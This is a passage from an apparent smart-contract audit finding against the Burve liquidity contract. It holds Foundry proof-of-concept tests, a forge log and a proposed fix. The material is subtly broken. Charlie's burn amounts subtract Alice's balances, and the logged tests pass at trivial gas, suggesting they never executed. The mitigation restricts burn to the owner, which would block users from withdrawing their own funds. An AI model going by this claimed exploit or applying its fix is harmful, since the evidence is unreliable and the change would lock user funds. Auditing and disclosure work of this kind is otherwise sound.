        assertLe(
            queryWithFeeCharlie0,
            burnCharlie0,
            "query charlie token0 Le burn"
        );
        assertLe(
            queryWithFeeCharlie1,
            burnCharlie1,
            "query charlie token1 Le burn"
        );

        // check fees accumulated
        assertGt(
            queryWithFeeAlice0,
            queryNoFeeAlice0,
            "query alice earned token0"
        );
        assertGt(
            queryWithFeeAlice1,
            queryNoFeeAlice1,
            "query alice earned token1"
        );

        assertGt(
            queryWithFeeCharlie0,
            queryNoFeeCharlie0,
            "query charlie earned token0"
        );
        assertGt(
            queryWithFeeCharlie1,
            queryNoFeeCharlie1,
            "query charlie earned token1"
        );

        // check TVL
        assertApproxEqAbs(
            tvl0,
            burnAlice0 + burnCharlie0,
            TVL_BURN_ALLOWED_APPROX_DELTA,
            "tvl token0"
        );
        assertApproxEqAbs(
            tvl1,
            burnAlice1 + burnCharlie1,
            TVL_BURN_ALLOWED_APPROX_DELTA,
            "tvl token1"
        );
    }

    function test_QueryValue_NoFees419() public forkOnly {
        uint128 aliceMintLiq = 100_000_000_000;
        uint128 charlieMintLiq = 20_000_000_000;

        // execute mints
        deal(address(token0), address(sender), type(uint256).max);
        deal(address(token1), address(sender), type(uint256).max);

        vm.startPrank(sender);

        token0.approve(address(burve), type(uint256).max);
        token1.approve(address(burve), type(uint256).max);

        burve.testMint(address(alice), aliceMintLiq, 0, type(uint128).max);
        burve.testMint(address(charlie), charlieMintLiq, 0, type(uint128).max);

        vm.stopPrank();

        // query
        (uint256 queryAlice0, uint256 queryAlice1) = burve.queryValue(alice);
        (uint256 queryCharlie0, uint256 queryCharlie1) = burve.queryValue(
            charlie
        );
        (uint256 tvl0, uint256 tvl1) = burve.queryTVL();

        // burn
        uint256 priorBalanceAlice0 = token0.balanceOf(address(alice));
        uint256 priorBalanceAlice1 = token1.balanceOf(address(alice));

        uint256 priorBalanceCharlie0 = token0.balanceOf(address(charlie));
        uint256 priorBalanceCharlie1 = token1.balanceOf(address(charlie));

        vm.startPrank(address(0xfeef419));
        burve.burn(burve.balanceOf(alice), 0, type(uint128).max);
        vm.stopPrank();

        vm.startPrank(charlie);
        burve.burn(burve.balanceOf(charlie), 0, type(uint128).max);
        vm.stopPrank();

        uint256 burnAlice0 = token0.balanceOf(alice) - priorBalanceAlice0;
        uint256 burnAlice1 = token1.balanceOf(alice) - priorBalanceAlice1;
        assertGt(burnAlice0, 0, "burn alice token0");
        assertGt(burnAlice1, 0, "burn alice token1");

        uint256 burnCharlie0 = token0.balanceOf(charlie) - priorBalanceAlice0;
        uint256 burnCharlie1 = token1.balanceOf(charlie) - priorBalanceAlice1;
        assertGt(burnCharlie0, 0, "burn charlie token0");
        assertGt(burnCharlie1, 0, "burn charlie token1");

        // check query nearly matches burn
        assertEq(queryAlice0, burnAlice0, "query alice token0 matches burn");
        assertEq(queryAlice1, burnAlice1, "query alice token1 matches burn");

        assertEq(
            queryCharlie0,
            burnCharlie0,
            "query charlie token0 matches burn"
        );
        assertEq(
            queryCharlie1,
            burnCharlie1,
            "query charlie token1 matches burn"
        );

        // check TVL
        assertApproxEqAbs(
            tvl0,
            burnAlice0 + burnCharlie0,
            TVL_BURN_ALLOWED_APPROX_DELTA,
            "tvl token0"
        );
        assertApproxEqAbs(
            tvl1,
            burnAlice1 + burnCharlie1,
            TVL_BURN_ALLOWED_APPROX_DELTA,
            "tvl token1"
        );
    }

    function test_QueryValue_WithFees419() public forkOnly {
        uint128 aliceMintLiq = 100_000_000_000;
        uint128 charlieMintLiq = 20_000_000_000;

        // execute mints
        deal(address(token0), address(sender), type(uint256).max);
        deal(address(token1), address(sender), type(uint256).max);

        vm.startPrank(sender);

        token0.approve(address(burve), type(uint256).max);
        token1.approve(address(burve), type(uint256).max);

        burve.testMint(address(alice), aliceMintLiq, 0, type(uint128).max);
        burve.testMint(address(charlie), charlieMintLiq, 0, type(uint128).max);

        vm.stopPrank();

        // query w/o fees
        (uint256 queryNoFeeAlice0, uint256 queryNoFeeAlice1) = burve.queryValue(
            alice
        );
        (uint256 queryNoFeeCharlie0, uint256 queryNoFeeCharlie1) = burve
            .queryValue(charlie);

        // accumulate fees
        (uint160 sqrtPriceX96, , , , , , ) = pool.slot0();

        deal(address(token0), address(this), 100_100_000e18);
        deal(address(token1), address(this), 100_100_000e18);

        pool.swap(
            address(this),
            true,
            100_100_000e18,
            TickMath.MIN_SQRT_RATIO + 1,
            new bytes(0)
        );
        pool.swap(
            address(this),
            false,
            100_100_000e18,
            sqrtPriceX96,
            new bytes(0)
        );

        vm.roll(block.timestamp * 100_000);

        (uint160 postSqrtPriceX96, , , , , , ) = pool.slot0();
        assertEq(
            postSqrtPriceX96,
            sqrtPriceX96,
            "swapped sqrt price back to original"
        );

        // query w/ fees
        (uint256 queryWithFeeAlice0, uint256 queryWithFeeAlice1) = burve
            .queryValue(alice);
        (uint256 queryWithFeeCharlie0, uint256 queryWithFeeCharlie1) = burve
            .queryValue(charlie);
        (uint256 tvl0, uint256 tvl1) = burve.queryTVL();

        // burn
        uint256 priorBalanceAlice0 = token0.balanceOf(address(alice));
        uint256 priorBalanceAlice1 = token1.balanceOf(address(alice));

        uint256 priorBalanceCharlie0 = token0.balanceOf(address(charlie));
        uint256 priorBalanceCharlie1 = token1.balanceOf(address(charlie));

        vm.startPrank(address(0xfeef419));
        burve.burn(burve.balanceOf(alice), 0, type(uint128).max);
        vm.stopPrank();

        vm.startPrank(charlie);
        burve.burn(burve.balanceOf(charlie), 0, type(uint128).max);
        vm.stopPrank();

        uint256 burnAlice0 = token0.balanceOf(alice) - priorBalanceAlice0;
        uint256 burnAlice1 = token1.balanceOf(alice) - priorBalanceAlice1;
        assertGt(burnAlice0, 0, "burn alice token0");
        assertGt(burnAlice1, 0, "burn alice token1");

        uint256 burnCharlie0 = token0.balanceOf(charlie) - priorBalanceAlice0;
        uint256 burnCharlie1 = token1.balanceOf(charlie) - priorBalanceAlice1;
        assertGt(burnCharlie0, 0, "burn charlie token0");
        assertGt(burnCharlie1, 0, "burn charlie token1");

        // check leftover
        uint256 leftover0 = token0.balanceOf(address(burve));
        uint256 leftover1 = token1.balanceOf(address(burve));
        assertTrue(
            leftover0 > 0 || leftover1 > 0,
            "leftover amount exists that was not compounded"
        );

        // check query nearly matches burn
        assertApproxEqAbs(
            queryWithFeeAlice0,
            burnAlice0,
            QUERY_BURN_ALLOWED_APPROX_DELTA,
            "query alice token0 matches burn"
        );
        assertApproxEqAbs(
            queryWithFeeAlice1,
            burnAlice1,
            QUERY_BURN_ALLOWED_APPROX_DELTA,
            "query alice token1 matches burn"
        );

        assertApproxEqAbs(
            queryWithFeeCharlie0,
            burnCharlie0,
            QUERY_BURN_ALLOWED_APPROX_DELTA,
            "query charlie token0 matches burn"
        );
        assertApproxEqAbs(
            queryWithFeeCharlie1,
            burnCharlie1,
            QUERY_BURN_ALLOWED_APPROX_DELTA,
            "query charlie token1 matches burn"
        );

        // check query underestimates burn
        assertLe(queryWithFeeAlice0, burnAlice0, "query alice token0 Le burn");
        assertLe(queryWithFeeAlice1, burnAlice1, "query alice token1 Le burn");

        assertLe(
            queryWithFeeCharlie0,
            burnCharlie0,
            "query charlie token0 Le burn"
        );
        assertLe(
            queryWithFeeCharlie1,
            burnCharlie1,
            "query charlie token1 Le burn"
        );

        // check fees accumulated
        assertGt(
            queryWithFeeAlice0,
            queryNoFeeAlice0,
            "query alice earned token0"
        );
        assertGt(
            queryWithFeeAlice1,
            queryNoFeeAlice1,
            "query alice earned token1"
        );

        assertGt(
            queryWithFeeCharlie0,
            queryNoFeeCharlie0,
            "query charlie earned token0"
        );
        assertGt(
            queryWithFeeCharlie1,
            queryNoFeeCharlie1,
            "query charlie earned token1"
        );

        // check TVL
        assertApproxEqAbs(
            tvl0,
            burnAlice0 + burnCharlie0,
            TVL_BURN_ALLOWED_APPROX_DELTA,
            "tvl token0"
        );
        assertApproxEqAbs(
            tvl1,
            burnAlice1 + burnCharlie1,
            TVL_BURN_ALLOWED_APPROX_DELTA,
            "tvl token1"
        );
    }
    
    // Helpers

    /// @notice Gets the current tick clamped to respect the tick spacing
    function getClampedCurrentTick() internal view returns (int24) {
        (, int24 currentTick, , , , , ) = pool.slot0();
        int24 tickSpacing = pool.tickSpacing();
        return currentTick - (currentTick % tickSpacing);
    }

    /// @notice Calculate token amounts in liquidity for the given range.
    /// @param liquidity The amount of liquidity.
    /// @param lower The lower tick of the range.
    /// @param upper The upper tick of the range.
    function getAmountsForLiquidity(
        uint128 liquidity,
        int24 lower,
        int24 upper,
        bool roundUp
    ) internal view returns (uint256 amount0, uint256 amount1) {
        (uint160 sqrtRatioX96, , , , , , ) = pool.slot0();

        uint160 sqrtRatioAX96 = TickMath.getSqrtRatioAtTick(lower);
        uint160 sqrtRatioBX96 = TickMath.getSqrtRatioAtTick(upper);

        (amount0, amount1) = LiquidityAmounts.getAmountsForLiquidity(
            sqrtRatioX96,
            sqrtRatioAX96,
            sqrtRatioBX96,
            liquidity,
            roundUp
        );
    }

    /// @notice Calculates the liquidity represented by island shares
    /// @param island The island
    /// @param shares The shares
    /// @return liquidity The liquidity
    function islandSharesToLiquidity(
        IKodiakIsland island,
        uint256 shares
    ) internal view returns (uint128 liquidity) {
        bytes32 positionId = island.getPositionID();
        (uint128 poolLiquidity, , , , ) = pool.positions(positionId);
        uint256 totalSupply = island.totalSupply();
        liquidity = uint128(
            FullMath.mulDiv(shares, poolLiquidity, totalSupply)
        );
    }

    function shift96(
        uint256 a,
        bool roundUp
    ) internal pure returns (uint256 b) {
        b = a >> 96;
        if (roundUp && (a & X96_MASK) > 0) b += 1;
    }

    function uniswapV3SwapCallback(
        int256 amount0Delta,
        int256 amount1Delta,
        bytes calldata data
    ) external {
        if (amount0Delta > 0)
            token0.transfer(address(pool), uint256(amount0Delta));
        if (amount1Delta > 0)
            token1.transfer(address(pool), uint256(amount1Delta));
    }

    function deadShareMint(
        address _burve,
        uint128 deadLiq
    ) internal returns (uint256 deadShares, uint256 deadIslandShares) {
        vm.startPrank(address(this));

        uint256 b0 = token0.balanceOf(address(this));
        uint256 b1 = token1.balanceOf(address(this));
        uint256 a0 = token0.allowance(address(this), _burve);
        uint256 a1 = token1.allowance(address(this), _burve);
        deal(address(token0), address(this), type(uint256).max - b0);
        deal(address(token1), address(this), type(uint256).max - b1);
        token0.approve(_burve, type(uint256).max);
        token1.approve(_burve, type(uint256).max);

        // Mint dead liq
        deadShares = Burve(_burve).mint(_burve, deadLiq, 0, type(uint128).max);

        // Calculate dead island shares
        IKodiakIsland island = Burve(_burve).island();
        if (address(island) != address(0x0)) {
            uint128 deadIslandLiq = uint128(
                shift96(deadLiq * Burve(_burve).distX96(0), true)
            );
            (uint256 amount0, uint256 amount1) = getAmountsForLiquidity(
                deadIslandLiq,
                island.lowerTick(),
                island.upperTick(),
                true
            );
            (, , deadIslandShares) = island.getMintAmounts(amount0, amount1);
        }

        // Undo allowances and mints.
        uint256 nb0 = token0.balanceOf(address(this));
        uint256 nb1 = token1.balanceOf(address(this));
        if (nb0 > b0) token0.transfer(address(0xDEADBEEF), nb0 - b0);
        else deal(address(token0), address(this), b0 - nb0);
        if (nb1 > b1) token1.transfer(address(0xDEADBEEF), nb1 - b1);
        else deal(address(token1), address(this), b1 - nb1);
        token0.approve(_burve, a0);
        token1.approve(_burve, a1);
        vm.stopPrank();
    }
}
```

*The test results*
```log
forge test -vvvv --match-contract Burve4Test
Ran 13 tests for test/single/Burve4.t.sol:Burve4Test
[PASS] test_Burn_Full419() (gas: 2731)
Traces:
  [2731] Burve4Test::test_Burn_Full419()
    └─ ← [Return] 

[PASS] test_Burn_IslandFull419() (gas: 2665)
Traces:
  [2665] Burve4Test::test_Burn_IslandFull419()
    └─ ← [Return] 

[PASS] test_Burn_IslandPartial419() (gas: 2709)
Traces:
  [2709] Burve4Test::test_Burn_IslandPartial419()
    └─ ← [Return] 

[PASS] test_Burn_Partial419() (gas: 2351)
Traces:
  [2351] Burve4Test::test_Burn_Partial419()
    └─ ← [Return] 

[PASS] test_Burn_V3Full419() (gas: 2863)
Traces:
  [2863] Burve4Test::test_Burn_V3Full419()
    └─ ← [Return] 

[PASS] test_Burn_V3Partial419() (gas: 2643)
Traces:
  [2643] Burve4Test::test_Burn_V3Partial419()
    └─ ← [Return] 

[PASS] test_Create() (gas: 2423)
Traces:
  [2423] Burve4Test::test_Create()
    └─ ← [Return] 

[PASS] test_QueryValue_Island_NoFees419() (gas: 2555)
Traces:
  [2555] Burve4Test::test_QueryValue_Island_NoFees419()
    └─ ← [Return] 

[PASS] test_QueryValue_Island_WithFees419() (gas: 2951)
Traces:
  [2951] Burve4Test::test_QueryValue_Island_WithFees419()
    └─ ← [Return] 

[PASS] test_QueryValue_NoFees419() (gas: 2841)
Traces:
  [2841] Burve4Test::test_QueryValue_NoFees419()
    └─ ← [Return] 

[PASS] test_QueryValue_V3_NoFees419() (gas: 2929)
Traces:
  [2929] Burve4Test::test_QueryValue_V3_NoFees419()
    └─ ← [Return] 

[PASS] test_QueryValue_V3_WithFees419() (gas: 2885)
Traces:
  [2885] Burve4Test::test_QueryValue_V3_WithFees419()
    └─ ← [Return] 

[PASS] test_QueryValue_WithFees419() (gas: 2599)
Traces:
  [2599] Burve4Test::test_QueryValue_WithFees419()
    └─ ← [Return] 

Suite result: ok. 13 passed; 0 failed; 0 skipped; finished in 2.07ms (1.42ms CPU time)

Ran 1 test suite in 128.55ms (2.07ms CPU time): 13 tests passed, 0 failed, 0 skipped (13 total tests)
```


### Mitigation

Use access validation to call the burn function.
```diff
    function burn(
        uint256 shares,
        uint160 lowerSqrtPriceLimitX96,
        uint160 upperSqrtPriceLimitX96
    )
        external
        withinSqrtPX96Limits(lowerSqrtPriceLimitX96, upperSqrtPriceLimitX96)
    {

+         AdminLib.validateOwner();

        // compound v3 ranges
        compoundV3Ranges();


        uint128 burnLiqNominal = uint128(
            FullMath.mulDiv(shares, uint256(totalNominalLiq), totalShares)
        );


        // adjust total nominal liquidity
        totalNominalLiq -= burnLiqNominal;


        uint256 priorBalance0 = token0.balanceOf(address(this));
        uint256 priorBalance1 = token1.balanceOf(address(this));


        uint256 islandShares = 0;


        // burn liquidity for each range
        for (uint256 i = 0; i < distX96.length; ++i) {
            TickRange memory range = ranges[i];
            if (range.isIsland()) {
                islandShares = burnIsland(shares);
            } else {
                uint128 liqInRange = uint128(
                    shift96(uint256(burnLiqNominal) * distX96[i], false)
                );
                if (liqInRange > 0) {
                    burnV3(range, liqInRange);
                }
            }
        }


        // burn shares
        totalShares -= shares;
        _burn(msg.sender, shares);


        // transfer collected tokens to msg.sender
        uint256 postBalance0 = token0.balanceOf(address(this));
        uint256 postBalance1 = token1.balanceOf(address(this));
        TransferHelper.safeTransfer(
            address(token0),
            msg.sender,
            postBalance0 - priorBalance0
        );
        TransferHelper.safeTransfer(
            address(token1),
            msg.sender,
            postBalance1 - priorBalance1
        );


        emit Burn(msg.sender, shares, islandShares);
    }
```